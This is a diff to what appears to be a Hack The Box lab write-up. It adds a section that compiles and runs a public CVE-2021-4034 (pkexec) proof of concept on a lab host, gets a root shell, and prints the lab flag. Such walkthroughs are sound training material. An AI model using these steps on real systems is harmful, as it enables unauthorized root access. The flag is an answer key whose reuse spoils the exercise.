@@ -79,3 +79,15 @@ git clone https://github.com/arthepsy/CVE-2021-4034.git
 ```python
 scp -r CVE-2021-4034 htb-student@10.129.205.113:/home/htb-student
 ```
+
+### Root Flag
+
+Compile binary, execute binary and get flag
+```python
+htb-student@ubuntu:~/CVE-2021-4034$ gcc cve-2021-4034-poc.c -o poc
+htb-student@ubuntu:~/CVE-2021-4034$ ./poc
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(htb-student)
+# find / -type f -name flag.txt -exec cat {} \; 2>/dev/null
+HTB{p0Lk1tt3n}
+```
